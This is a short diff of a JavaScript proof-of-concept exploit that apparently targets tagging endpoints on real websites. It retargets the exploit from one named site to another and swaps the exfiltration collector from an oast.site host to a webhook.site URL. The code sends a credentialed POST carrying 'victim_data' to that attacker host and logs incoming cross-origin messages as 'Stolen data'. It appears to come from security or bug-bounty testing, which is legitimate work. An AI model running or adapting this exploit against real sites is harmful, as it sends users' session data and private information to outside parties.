@@ -40,7 +40,7 @@
                     command: {
                         commandType: 0,
                         params: {
-                            url: 'https://xiksz155ah7y0k1oe85rhiilwefk531ut.oast.site/taha',
+                            url: 'https://webhook.site/e3349a6b-5178-44fd-9a47-b134cf5362ff/taha',
                             method: 1, // POST
                             body: 'victim_data=sensitive',
                             credentials: 'include'
@@ -57,7 +57,7 @@
         // 4. Listen for responses
         window.addEventListener('message', (e) => {
             console.debug('[DEBUG] Received message event:', e);
-            if (e.origin !== 'https://tagging.wetransfer.com') {
+            if (e.origin !== 'https://tagging.care.com') {
                 console.log('[INFO] Stolen data:', e.data);
             } else {
                 console.log('[INFO] Message from trusted origin:', e.data);
